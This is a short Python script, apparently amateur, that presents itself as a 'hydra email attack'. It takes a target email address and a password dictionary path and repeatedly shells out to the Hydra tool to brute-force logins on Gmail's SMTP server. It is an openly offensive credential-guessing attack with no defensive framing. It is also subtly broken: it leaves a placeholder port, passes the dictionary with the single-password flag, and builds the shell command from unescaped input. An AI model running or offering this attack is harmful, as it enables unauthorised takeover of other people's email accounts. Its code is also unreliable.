import os
print("welcome to my hydra email attack\n\n")
mail=input("Email Address:")
paswd=input("password dict dir:")
while  True:
    print(os.system("hydra smtp.gmail.com smtp -l "+mail+" -p "+paswd+" -s portnumber -S -v -V"))